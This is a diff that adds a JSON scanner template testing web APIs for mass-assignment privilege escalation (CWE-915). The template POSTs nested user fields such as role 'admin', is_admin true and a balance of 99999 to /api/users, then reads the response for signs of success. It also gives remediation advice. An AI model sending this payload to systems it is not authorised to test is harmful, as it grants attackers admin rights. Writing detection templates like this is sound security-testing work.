@@ -1,0 +1,55 @@
+{
+  "name": "Mass Assignment via JSON Nesting",
+  "description": "Test if nested JSON parameters allow privilege escalation via mass assignment",
+  "author": "JarDani",
+  "severity": "CRITICAL",
+  "cwe": "CWE-915",
+  "target": {
+    "method": "POST",
+    "path": "/api/users",
+    "params": [],
+    "headers": {},
+    "body": {
+      "user": {
+        "role": "admin",
+        "is_admin": true,
+        "privilege": "admin",
+        "balance": 99999
+      }
+    }
+  },
+  "payloads": [
+    "admin"
+  ],
+  "generate": {
+    "type": "none",
+    "config": {}
+  },
+  "detect": {
+    "response_contains": [
+      "admin",
+      "role",
+      "privilege"
+    ],
+    "response_not_contains": [
+      "error",
+      "invalid"
+    ],
+    "status_codes": [
+      200,
+      201
+    ],
+    "response_differs": true,
+    "time_delay": 0,
+    "header_contains": {}
+  },
+  "false_positive_filter": {
+    "baseline_diff_pct": 5,
+    "exclude_patterns": []
+  },
+  "impact": "Privilege escalation via mass assignment. Attacker can set role=admin on registration.",
+  "remediation": "Use explicit field allowlists. Never bind request body directly to model.",
+  "references": [
+    "CWE-915"
+  ]
+}
